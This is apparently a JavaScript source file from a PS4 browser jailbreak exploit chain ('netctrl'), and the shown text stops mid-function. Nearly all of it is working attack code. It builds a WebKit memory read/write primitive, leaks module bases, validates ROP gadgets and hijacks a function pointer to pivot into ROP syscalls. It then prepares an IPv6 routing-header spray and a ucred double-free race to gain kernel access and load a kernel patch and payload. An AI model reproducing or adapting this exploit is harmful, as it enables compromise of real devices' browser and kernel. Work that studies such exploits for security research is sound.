import { establishPrimitive } from "./core.js";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./offsets.js";
import { createContext, layoutContext, breathe } from "./module/rop.js";
import { validateGadgets, discoverStubs } from "./module/gadgets.js";
import { loadPayload, kpatchPath, loadBinary, kpatchJmpSites } from "./module/assets.js";
import { checkJailbroken } from "./check-jailbroken.js";
import { runChain, mark, state, check, trace, hx, checkCounts, hexBytes } from "./module/log.js";
import { bufferAddress } from "./module/syscall.js";
import { isKernelPtr, isKernelPtrAligned, isImageAddr, isPlausibleBase, isPtrish, sameI64 } from "./module/addr.js";
import { makeRpc } from "./workers.js";
import { COMMON, NETCTRL as C, NETCTRL_SYS } from "./module/constants.js";
import { resolvePthreadCreate } from "./post-exploit.js";

const SYS = NETCTRL_SYS;

/*
DEDUPLICATED against src/module/. Everything below that used to be a private
copy now comes from a shared module -- each was verified identical to the
module version before deletion. Where netctrl had a local name (bufAddr,
ptrish, kptr, kptr2, kaddrOk, same) an alias at the use site keeps the call
sites unchanged, the same style lapse.js uses.

isImageAddr and isPlausibleBase have no local alias: their call sites (the
kl_lock gate and the module-base check) read through the shared names
directly, so kAligned/isImageAddr exist only inside module/addr.js.

NOT deduplicated: put(). module/rop.js has a private put() with the same
body, but it is NOT exported (rop.js:20), and exporting it would touch a file
lapse.js also imports -- out of scope for a netctrl-only cleanup.
*/
const { AF_UNIX, SOCK_STREAM, UCRED_SIZE, KQUEUE_SIZE, NUM_UIO_IOV, UIO_SIZE,
    IOVEC_SIZE, MSGHDR_SIZE, NUM_MSG_IOV, AF_INET6, IPPROTO_IPV6, IPV6_RTHDR,
    IP6_RTHDR0_SIZE, IN6_ADDR_SIZE, SOL_SOCKET, RTP, RTP_SET,
    RTP_PRIO_REALTIME, MAIN_CORE, CPU_LEVEL_WHICH, CPU_WHICH_TID,
    JSVALUE_UNDEFINED } = { ...C, ...COMMON };

/*
Logging layer is shared with lapse.js (ps4/log.js). netctrl's
   differences from lapse's defaults are all init options here: it posts the
   RAW detail (not the terse one) under prefix PS4-S10, and it highlights a
   different tag vocabulary (REBOOT/MISS/LOST/POISON/ABORTED/REFUSED/...).
*/
export function run(options) {
    return runChain({
        ...options,
        postPrefix: "PS4-S10",
        postRawDetail: true,
        badRe: /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i,
        warnRe: /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i,
        okRe: /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i,
    }, runOriginal);
}

const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;
// NUM_UIO_IOV / UIO_SIZE come from constants.js (NETCTRL_SYS).
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
/*
MAX_ROUNDS_TWIN is the ONLY bound on findTwins, and it was 10.

findTwins scans all 256 ipv6 sockets per round (two ROP syscalls each), so
10 rounds is 5,120 syscalls -- and each round ends with nothing that says
whether progress was made. A twin exists only after the double free lands
AND the chunk is re-taken, so on a boot where that takes a moment the scan
gives up long before the alias can appear, reports no-twins, and the attempt
is burned for nothing. The retry loop then does the same thing again.

MAX_ROUNDS_TRIPLET, for the same kind of scan on the same pool, is 500.
There is no reason the twin search -- which GATES the triplet search --
should be 50x smaller than the thing it gates. 64 covers the observed
re-take latency with room to spare and still costs 8,192 syscalls in the
pathological case, which the per-socket breathe() bounds.

?twinrounds= overrides.
*/
const MAX_ROUNDS_TWIN = 64, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;

const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;
/*
Why reboot is demanded, so a run that ends "needs reboot" says WHICH
condition tripped instead of leaving it to be inferred from scrollback.
Set wherever rebootRequired is set; reported at STEP10-SUMMARY.
*/
let rebootReason = "none";

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;

async function runOriginal() {
    let p = null;
    try {

        const NUM_IOV_WORKER = params.has("iov")
            ? parseInt(params.get("iov"), 10) : 4;
        const NUM_ATTEMPT = params.has("attempts")
            ? parseInt(params.get("attempts"), 10) : 8;
        const NUM_IOV_SPRAY = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x100;
        /*
        Deadline and observation record for the refcount race. The race had
        NEITHER: its loop bound was NUM_IOV_SPRAY (256 by default) so a boot
        where the chunk is never re-taken spent every round and then had
        nothing to show for it, and no call site ever recorded what the master
        socket actually read while the racers were parked. Both are the reason
        a run that stops just after IOV-PARKED 4/4 is undiagnosable: the last
        log line is the parked count, printed on round 1 only, and the loop
        then either burns its rounds silently or blocks in the round-tail
        Promise.all.
        */
        const RACE_MS = params.has("racems")
            ? parseInt(params.get("racems"), 10) : 6000;
        /*
        Bound on the join in unparkAll(). The racers are fired with a 0
        timeout, so without this the round tail can wait forever on a worker
        that never returns -- the one place in the race with no deadline.
        Generous by default because a parked racer is expected and slow to
        wake; ?unparkms= to tune.
        */
        const UNPARK_MS = params.has("unparkms")
            ? parseInt(params.get("unparkms"), 10) : 4000;
        const raceReads = [];
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
            state("no offsets for this firmware", "bad");
            return { success: false, reason: "unsupported firmware" };
        }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
            + " spray=" + NUM_IOV_SPRAY
            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

        let kpatch = null, payload = null;
        const kpatchName = kpatchPath(key, off);
        let KPATCH_JMP_SITES = [];
        try {
            kpatch = await loadBinary(kpatchName);
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) KPATCH_JMP_SITES = kpatchJmpSites(kpatch);
        mark("KPATCH-BLOB", kpatch
            ? "blob=" + kpatchName + " bytes=" + kpatch.length
            + " sites=" + KPATCH_JMP_SITES.length
            : "blob=" + kpatchName + " MISSING");
        try {
            payload = await loadPayload();
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " entry="
            + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
            : "MISSING");

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });

        /*
        THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
        proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
        only NULLS references; it does not free anything. It converts 137 MB
        of quiet pinned memory into 137 MB of garbage and leaves the sweep to
        JSC, which last time chose to run it somewhere inside the triple-free
        race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).

        So: release it HERE, then make the collection happen HERE too, before
        a single worker or kernel object exists.
        OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
        is not freeing: it turns quiet pinned memory into garbage that JSC
        collects whenever it chooses, including mid-race. The sweep below was
        meant to force that collection at a safe point and MEASURABLY DOES
        NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
        floor, i.e. a few ms of overhead and no full collection anywhere.
        Until the sweep can be shown to actually collect, the pinned profile
        is the safer one. ?pair=1 to experiment.
        */
        const PAIR_ON = params.get("pair") === "1";
        const SWEEP_CYCLES = params.has("sweep")
            ? parseInt(params.get("sweep"), 10) : 6;
        const SWEEP_MS = params.has("sweepms")
            ? parseInt(params.get("sweepms"), 10) : 60;
        const SWEEP_MB = params.has("sweepmb")
            ? parseInt(params.get("sweepmb"), 10) : 8;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        /*
        Provoke the collection. globalThis.gc does not exist in a shipping
        WebProcess (core.js:368 guards for it and never fires), so the only
        levers are allocation pressure and turning the event loop -- the
        incremental sweeper cannot run while we hold the thread.

        OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
        collection landing here instead of on the race. If every cycle sits
        at the floor, nothing was swept and this experiment did nothing.
        */
        if (pairStatus.promoted && SWEEP_CYCLES > 0) {
            state("sweeping...", "warn");
            const t0 = Date.now();
            let worst = 0;
            for (let i = 0; i < SWEEP_CYCLES; ++i) {
                const c0 = Date.now();
                let junk = [];
                for (let k = 0; k < SWEEP_MB; ++k)
                    junk.push(new ArrayBuffer(0x100000));
                junk.length = 0; junk = null;
                await new Promise(r => setTimeout(r, SWEEP_MS));
                const dt = Date.now() - c0;
                if (dt > worst) worst = dt;
            }
            mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
                + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
                + " total_ms=" + (Date.now() - t0));
        } else {
            mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                + " cycles=" + SWEEP_CYCLES);
        }
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        if (!check("module-bases-0x4000-aligned",
            isPlausibleBase(webkitBase) && isPlausibleBase(libkernelBase), "")) return;

        /*
        Shared gadget validation (ps4/gadgets.js) -- same definitions and
        read discipline as lapse's; netctrl's G0..G5 pivot gadgets are the
        rebasable entries in the table.
        */
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30], true],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07], true],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5], true],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08], true],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp], true],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3], true],
        ];
        const gv = validateGadgets(p, webkitBase, GAD, hexBytes, mark);
        const G = gv.gadgets;
        if (!check("gadget-table-fits-module", !gv.fatal,
            gv.gated + "/" + gv.total)) return;
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        /*
        Shared syscall stub discovery (ps4/gadgets.js) -- identical seed-then-
        scan as lapse's, no requirePlain here so netctrl keeps tolerating
        wrapper stubs exactly as before.
        */
        const disc = discoverStubs(p, libkernelBase, off, SYS);
        const stubAddr = disc.stubAddr;
        mark("STUBS", "seeded=" + disc.seeded + " scanned=" + disc.scanned);
        if (!check("syscall-page-needs-stub", disc.missing.length === 0,
            disc.missing.join(","))) return;

        /* Alias of module/syscall.js bufferAddress -- identical body. */
        const bufAddr = ab => bufferAddress(p, off, ab);
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }

        /*
        Shared ROP context builder (ps4/rop.js) -- identical to lapse's.
        */
        const M = createContext({ p, offsets: off, gadgets: G, keepAlive });
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
            layoutContext(M, off, G, argGadget, JSVALUE_UNDEFINED, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return {
                lo: M.frameDv.getUint32(0, true),
                hi: M.frameDv.getUint32(4, true),
                i32: M.frameDv.getUint32(0, true) | 0
            };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        const uid = sc(SYS.getuid).i32;
        const euid = sc(SYS.geteuid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + uid + " euid=" + euid);
        const jb = checkJailbroken({ sc, sys: SYS, mark, state });
        if (jb.alreadyJailbroken) {
            return {
                success: false, alreadyJailbroken: true,
                reason: "console is already jailbroken"
            };
        }

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);

        /*
        R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
        every reader below then parses whatever the PREVIOUS call left in the
        buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
        requested window keeps this proportional to the copy already being
        made -- this runs inside the spray loops.
        */
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        /*
        ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
        rthdr aliases the freed ucred must never be touched again. The lethal
        operation is setRthdr: on a socket that already owns an rthdr it is a
        free-then-realloc, so re-spraying a burned socket FREES the aliased
        chunk and leaves the other owner dangling. freeRthdr and close are
        equally fatal. A burned fd is therefore excluded from every spray,
        every scan, and the teardown close -- until kernel R/W can repair it.
       */
        const burned = new Set();
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) {
                burned.add(fd);
                mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
            }
        }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2);
            dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
            sprayAddr, sprayLen).i32;
        const freeRthdr = s => {
            /*
            ITEM 6(a) chokepoint. The other guards filter at SELECTION time
            (findTwins/findTriplet never hand back a burned fd). This is the
            structural one: even if a future edit lets a burned fd through,
            the free that would make it a double free cannot happen.
            */
            if (burned.has(s)) {
                mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                return -1;
            }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };

        /*
        `need` = the highest byte offset the CALLER will actually parse. A
        copyout shorter than that is reported as -1 rather than handing back
        the previous call's bytes. No mark() here -- this is a hot path; the
        count is reported once at make_karw.
        */
        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, size);
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        /*
        FRESHNESS, not shape. The recurring defect in this file is a caller
        that gates its leakDv reads on getRthdr's return but cannot tell a
        FRESH read from a STALE one when the read fails. getRthdr only
        refreshes leakDv when it returns >= 0; on rv != 0 or a short copyout
        leakDv still holds whatever the PREVIOUS successful call put there,
        and every caller then parses those bytes as if they described the
        socket it just asked about.

        R2's 0xee sentinel makes staleness visible instead of silent. getRthdr
        (R2_ON) fills [0,size) with 0xee before the call, so a caller that gets
        a non-negative return can additionally demand that the bytes it is
        about to parse are NOT still the sentinel. Crucially this also catches
        the case getRthdr cannot: a copyout that reports a long enough length
        while copying nothing meaningful.

        Returns { ok, got } and nothing else -- deliberately NOT the parsed
        values, so there is no shorthand that skips the ok test.
        */
        function freshRthdr(s, size, need) {
            const got = getRthdr(s, size, need);
            if (got < 0) return { ok: false, got: got, why: "readfail" };
            if (R2_ON && leakDv.getUint32(0, true) === 0xeeee
                && leakDv.getUint32(4, true) === 0xeeee)
                return { ok: false, got: got, why: "sentinel" };
            return { ok: true, got: got };
        }

        /*
        One reader for the master's tag word, so POST-TRIPLE and IOV-RELEASED
        cannot drift apart. Returns a DESCRIPTIVE STRING for the log rather
        than a value: every previous caller returned either a number or
        "readfail", and the number was indistinguishable from a stale read.
        */
        function masterTagInfo(fd, what) {
            const fr = freshRthdr(fd, IP6_RTHDR0_SIZE, 8);
            if (!fr.ok) return what + "=" + fr.why + "(got=" + fr.got + ")";
            const v = leakDv.getUint32(4, true) >>> 0;
            const tagged = ((v & 0xffff0000) >>> 0) === RTHDR_TAG;
            return what + "=" + hx(v) + (tagged ? "/tagged" : "/UNTAGGED")
                + " refcnt=" + leakDv.getInt32(0, true);
        }

        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);

        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0);
        put(msgDv, 0x10, iovAddr);
        msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        /*
        NON-BLOCKING iovSs. unparkAll() wakes the racers by writing one byte
        per worker on iovSs[1] and then READS one byte per worker back off
        iovSs[0]. socketpair() gives a BLOCKING pair, and sc() is a synchronous
        ROP syscall on the main JS thread -- so if fewer bytes are queued than
        the loop asks for, that read parks the WebProcess forever and the
        console has to be pulled. unwind() already carries a comment about this
        exact hazard for uioSs; iovSs never got the same treatment.

        O_NONBLOCK makes the read return EAGAIN instead of blocking, which
        turns the worst case (console pull) into a counted shortfall.
        */
        sc(SYS.fcntl, iovSs[0], F_SETFL, O_NONBLOCK);
        sc(SYS.fcntl, iovSs[1], F_SETFL, O_NONBLOCK);
        sc(SYS.fcntl, uioSs[0], F_SETFL, O_NONBLOCK);
        sc(SYS.fcntl, uioSs[1], F_SETFL, O_NONBLOCK);
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs-exist",
            masterPipe[0] > 0 && masterPipe[1] > 0
            && slavePipe[0] > 0 && slavePipe[1] > 0,
            "master " + masterPipe + "  slave " + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);

        new Uint8Array(uioIovAb).fill(0);
        put(uioIovDv, 0, dummyAddr);
        /*
        WATCHDOG. NUM_IPV6_SOCK (256) unguarded ROP socket() calls. No early
        exit unless the kernel refuses an fd, so this is one unbroken
        synchronous stretch of up to 256 sc() calls before the spray loops
        even start -- and it runs again on every attempt. breathe() per
        iteration costs one Date.now() below budget and bounds the stretch.
        */
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            await breathe();
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
            ipv6.length + "/" + NUM_IPV6_SOCK);



        /*
        Shared worker RPC (workers.js) -- netctrl's superset version with
        labelled errors and a per-call timeoutMs (0 = no timeout).
        */
        /* Alias of module/addr.js isPtrish -- same predicate, shared impl. */
        const ptrish = isPtrish;

        const NUM_UIO_WORKER = params.has("uio")
            ? parseInt(params.get("uio"), 10) : 4;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            w.worker = new Worker("src/worker.js");
            w.rpc = makeRpc(w.worker, name, undefined, (n, msg) => mark("WORKER-ONERROR", n + " " + msg));
            if ((await w.rpc("ping", 15000)) !== "pong")
                throw new Error(name + " did not answer ping");
            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
            const arr = await w.rpc("init", 15000, sLo, sHi);
            keepAlive.push(arr);
            const D = bufAddr(arr.buffer);
            if ((p.read4(D) >>> 0) !== sLo)
                throw new Error(name + ": transfer did not preserve the store");
            const storage = p.read8(D.add32(0x10));
            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
            const bf = p.read8(mc.add32(8));
            let wm = null, wv = null, wl = null;
            for (let k = 1; k <= 8; ++k) {
                const val = p.read8(bf.sub32(8 * k));
                if (!ptrish(val)) continue;
                const inl = p.read8(val.add32(0x10));
                const len = p.read4(val.add32(0x18)) >>> 0;
                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
            }
            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
            p.write8(wm.add32(0x10), wv); w.wired = true;
            await w.rpc("setup", 15000, wl.low, wl.hi);
            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
            w.armed = true;
            w.ctx = createContext({ p, offsets: off, gadgets: G, keepAlive });
        }
        check("worker-came-arw",
            workers.length === TOTAL_WORKERS,
            workers.length + "/" + TOTAL_WORKERS);
        const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
        const uioWorkers = workers.slice(NUM_IOV_WORKER);
        mark("WORKER-POOLS", "iov=" + iovWorkers.length
            + " uio=" + uioWorkers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        /*
        ENTRY MARK. WORKER-POOLS printed above and the pair of marks after
        this block did not, so a death in here was previously reported only as
        "the last line was WORKER-POOLS". Nothing between them is logged.
        */
        mark("ATTRS-SAVE", "phase=enter buffers=ok");
        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true);
        prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
        /*
        MARKED, because this stretch is a blind spot with no log output in it
        and it is where a boot died: the last line was `worker-came-arw 8/8`
        and the next thing the file prints -- WORKER-POOLS, a few statements
        earlier -- never appeared. If a run dies between the two marks below,
        the last one names which syscall it was in.

        These two ROP reads are also the values restoreThreadAttrs later
        writes back. If cpuset_getaffinity fails, maskDv still holds the zero
        it was filled with, savedMask becomes {0,0}, and the restore path
        would faithfully put this thread on NO CORES. Report the result rather
        than storing it blind.
        */
        mark("ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);

            /*
            MAIN THREAD FIRST. attrsRestored is latched at the top of this
            function, so a death anywhere below leaves main realtime-256 on
            MAIN_CORE AND makes the finally's retry a permanent no-op -- the
            console then refuses to power off. The 16 worker RPCs used to run
            first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
            nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
            thread and never touches a worker; we cannot copy that (our
            workers outlive the page) but we can copy the ordering.
            Widen affinity before dropping priority, never the reverse.
            */
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true);
            maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true);
            prioDv.setUint16(2, savedPrio[1], true);
            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;

            new Uint8Array(maskAb).fill(0);
            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
                ID, 0x10, maskAddr);
            const backMask = new int64(maskDv.getUint32(0, true),
                maskDv.getUint32(4, true));
            prioDv.setUint16(0, 0xffff, true);
            prioDv.setUint16(2, 0xffff, true);
            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
            const good = backMask.low === savedMask.low
                && backMask.hi === savedMask.hi
                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
                + " rtprio=" + pr + " mask=" + backMask
                + " prio={" + backPrio + "} wanted=" + savedMask
                + " {" + savedPrio + "}");
